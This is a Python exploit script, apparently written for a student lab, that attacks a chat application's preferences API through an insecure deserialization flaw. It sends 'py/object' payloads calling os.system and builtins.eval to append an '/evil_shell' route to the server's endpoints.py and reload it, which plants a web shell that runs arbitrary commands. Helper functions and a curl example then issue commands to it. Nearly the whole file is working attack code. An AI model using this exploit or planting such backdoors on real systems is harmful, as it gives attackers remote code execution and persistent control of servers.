"""
This file contains code that modifies the endpoints.py 
file of the target application to add a new route 
that allows for remote command execution. 
It also includes functions to reload the endpoints.py file after modification.
"""

# ONCE THE NEW ROUTE IS ADDED, YOU CAN USE THE FOLLOWING COMMAND TO EXECUTE REMOTE COMMANDS:
# curl -s "http://TARGET_HOST:TARGET_PORT/evil_shell?cmd=whoami" | jq -r '.output'
# OR

def send_evil_cmd(args, session, cmd):
    resp = retry_request(
        lambda: session.get(url=f"{args.target}/evil_shell", params={"cmd": cmd})
    )
    return resp.json().get("output").replace("\n", "")



NEW_EVIL_ROUTE = [
    "",
    '@app.get("/evil_shell", tags=["Admin"])',
    "async def evil_shell(cmd: str):\n    if not cmd: return None",
    "    import subprocess",
    "    proc = subprocess.Popen(cmd, shell=True, stdout=-1, stderr=-1)",
    "    stdout, stderr = proc.communicate()",
    '    return {"output": (stdout + stderr).decode("utf-8", errors="ignore")}',
]


def alter_endpoint_file(args, session):
    for evil in NEW_EVIL_ROUTE:
        payload = {
            "py/object": "os.system",
            "py/initargs": [
                "echo 'EVIL' >> \"/home/student/chat_app/chat/views/endpoints.py\"".replace(
                    "EVIL", f"{evil}"
                )
            ],
        }
        update_and_run_prefs(args, session, payload)


def reload_endpoint_file(args, session):
    payload = {
        "py/object": "builtins.eval",
        "py/initargs": [
            "__import__('importlib').reload(__import__('sys').modules['chat.views.endpoints'])"
        ],
    }
    update_and_run_prefs(args, session, payload)


def update_and_run_prefs(args, session, payload):
    url = f"{args.target}/api/update-preferences?user_id={args.user_id}"
    resp = retry_request(lambda: session.post(url=url, json=payload, proxies=PROXIES))
    print(resp.status_code, resp.status_code == 200)
    url = f"{args.target}/api/get-preferences?user_id={args.user_id}"
    resp = retry_request(lambda: session.get(url=url, proxies=PROXIES))
    print(resp.status_code, resp.status_code == 500)